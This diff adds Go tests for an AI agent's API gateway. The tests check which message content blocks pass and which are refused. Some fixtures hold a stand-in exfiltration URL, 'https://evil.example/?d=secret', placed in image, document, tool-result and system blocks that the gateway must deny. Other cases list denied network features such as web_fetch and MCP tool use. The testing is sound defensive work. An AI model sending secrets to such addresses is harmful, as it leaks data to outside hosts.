@@ -3,6 +3,8 @@ package agent
 import (
 	"github.com/Deikus-LXXVII/rubi/internal/home/agent/roles"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 )
@@ -90,6 +92,93 @@ func TestGatewayBodyPolicy(t *testing.T) {
 	}
 }
 
+func TestGatewayContentPolicy(t *testing.T) {
+	const url = `{"type":"url","url":"https://evil.example/?d=secret"}`
+	msg := func(content string) string {
+		return `{"model":"m","messages":[{"role":"user","content":` + content + `}]}`
+	}
+	cases := []struct {
+		name, body string
+		webSearch  bool
+		want       int
+	}{
+		{"string content", msg(`"hi"`), false, 200},
+		{"text block", msg(`[{"type":"text","text":"hi"}]`), false, 200},
+		{"base64 image", msg(`[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAA"}}]`), false, 200},
+		{"base64 pdf", msg(`[{"type":"document","source":{"type":"base64","media_type":"application/pdf","data":"AAAA"}}]`), false, 200},
+		{"text document", msg(`[{"type":"document","source":{"type":"text","media_type":"text/plain","data":"x"}}]`), false, 200},
+		{"nested content document", msg(`[{"type":"document","source":{"type":"content","content":[{"type":"text","text":"x"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AA"}}]}}]`), false, 200},
+		{"tool use and result", msg(`[{"type":"tool_use","id":"t","name":"Read","input":{}},{"type":"tool_result","tool_use_id":"t","content":[{"type":"text","text":"x"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AA"}}]}]`), false, 200},
+		{"tool result string", msg(`[{"type":"tool_result","tool_use_id":"t","content":"ok"}]`), false, 200},
+		{"thinking", msg(`[{"type":"thinking","thinking":"x","signature":"s"},{"type":"redacted_thinking","data":"d"}]`), false, 200},
+		{"search_result label", msg(`[{"type":"search_result","source":"https://example.org","title":"t","content":[{"type":"text","text":"x"}]}]`), false, 200},
+		{"system string", `{"system":"be nice","messages":[]}`, false, 200},
+		{"system blocks", `{"system":[{"type":"text","text":"be nice"}],"messages":[]}`, false, 200},
+		{"web search history allowed", msg(`[{"type":"server_tool_use","id":"s","name":"web_search","input":{}},{"type":"web_search_tool_result","tool_use_id":"s","content":[]}]`), true, 200},
+		{"web search history denied", msg(`[{"type":"web_search_tool_result","tool_use_id":"s","content":[]}]`), false, 403},
+		{"web search use denied", msg(`[{"type":"server_tool_use","id":"s","name":"web_search","input":{}}]`), false, 403},
+		{"web_fetch use denied", msg(`[{"type":"server_tool_use","id":"s","name":"web_fetch","input":{}}]`), true, 403},
+		{"web_fetch result denied", msg(`[{"type":"web_fetch_tool_result","tool_use_id":"s","content":{}}]`), true, 403},
+		{"mcp_tool_use denied", msg(`[{"type":"mcp_tool_use","id":"s","name":"x","server_name":"y","input":{}}]`), true, 403},
+		{"container_upload denied", msg(`[{"type":"container_upload","file_id":"f"}]`), true, 403},
+		{"unknown block denied", msg(`[{"type":"brand_new"}]`), true, 403},
+		{"block without type denied", msg(`[{"text":"x"}]`), true, 403},
+		{"case-folded type denied", msg(`[{"Type":"text","text":"x"}]`), true, 403},
+		{"url image denied", msg(`[{"type":"image","source":` + url + `}]`), false, 403},
+		{"url document denied", msg(`[{"type":"document","source":` + url + `}]`), false, 403},
+		{"url image in tool_result denied", msg(`[{"type":"tool_result","tool_use_id":"t","content":[{"type":"image","source":` + url + `}]}]`), false, 403},
+		{"url in nested document denied", msg(`[{"type":"document","source":{"type":"content","content":[{"type":"image","source":` + url + `}]}}]`), false, 403},
+		{"url image in system denied", `{"system":[{"type":"image","source":` + url + `}],"messages":[]}`, false, 403},
+		{"file source denied", msg(`[{"type":"document","source":{"type":"file","file_id":"file_1"}}]`), false, 403},
+		{"unknown source denied", msg(`[{"type":"image","source":{"type":"s3","bucket":"b"}}]`), false, 403},
+		{"source without type denied", msg(`[{"type":"image","source":{"url":"https://evil.example/"}}]`), false, 403},
+		{"repeated source type denied", msg(`[{"type":"image","source":{"type":"base64","type":"url","url":"https://evil.example/"}}]`), false, 403},
+		{"case-folded source denied", msg(`[{"type":"image","Source":` + url + `}]`), false, 403},
+		{"messages not a list denied", `{"messages":{"a":1}}`, false, 403},
+		{"deep nesting denied", msg(strings.Repeat(`[{"type":"tool_result","content":`, 12) + `"x"` + strings.Repeat(`}]`, 12)), false, 403},
+	}
+	for _, c := range cases {
+		g, up := gwPolicy(t, c.webSearch)
+		code, body := post(t, g, "/v1/messages", c.body)
+		if code != c.want {
+			t.Errorf("%s: status %d, want %d (%s)", c.name, code, c.want, body)
+		}
+		if c.want == 403 && (up.count() != 0 || !strings.Contains(body, `"permission_error"`)) {
+			t.Errorf("%s: refused request not refused cleanly", c.name)
+		}
+		if c.want == 200 && up.count() != 1 {
+			t.Errorf("%s: not forwarded", c.name)
+		}
+	}
+}
+
+func TestGatewayBodyBudget(t *testing.T) {
+	old := gatewayBodyBudget
+	gatewayBodyBudget = 100 << 10
+	defer func() { gatewayBodyBudget = old }()
+	g, up := gwPolicy(t, false)
+	big := `{"messages":[{"role":"user","content":"` + strings.Repeat("a", 200<<10) + `"}]}`
+	if code, _ := post(t, g, "/v1/messages", big); code != http.StatusServiceUnavailable || up.count() != 0 {
+		t.Errorf("over budget: status %d, upstream saw %d", code, up.count())
+	}
+	g.budgetMu.Lock()
+	held := g.held
+	g.budgetMu.Unlock()
+	if held != 0 {
+		t.Errorf("budget not released: %d held", held)
+	}
+	small := `{"messages":[{"role":"user","content":"hi"}]}`
+	if code, _ := post(t, g, "/v1/messages", small); code != 200 {
+		t.Errorf("after the budget is free again: status %d", code)
+	}
+	g.budgetMu.Lock()
+	held = g.held
+	g.budgetMu.Unlock()
+	if held != 0 {
+		t.Errorf("budget not released after success: %d held", held)
+	}
+}
+
 func TestGatewayBodyCap(t *testing.T) {
 	g, up := gwPolicy(t, false)
 	big := `{"messages":[{"role":"user","content":"` + strings.Repeat("a", gatewayMaxBody) + `"}]}`
@@ -158,5 +247,20 @@ func TestGatewayKeepsEveryBetaTheCLIKnows(t *testing.T) {
 	}
 	if !strings.Contains(filterBeta([]string{"web-search-2025-03-05"}, true), "web-search-2025-03-05") {
 		t.Error("web-search beta dropped with the policy")
+	}
+}
+
+// Real request bodies of the bundled Claude Code CLI (from the runner's scripted-API integration tests).
+func TestGatewayPassesRealClaudeCodeBodies(t *testing.T) {
+	for _, f := range []string{"claude_code_first_turn.json", "claude_code_tool_result.json"} {
+		b, err := os.ReadFile(filepath.Join("testdata", f))
+		if err != nil {
+			t.Fatal(err)
+		}
+		for _, ws := range []bool{false, true} {
+			if why := checkBody(b, ws); why != "" {
+				t.Errorf("%s (webSearch=%v): %s", f, ws, why)
+			}
+		}
 	}
 }
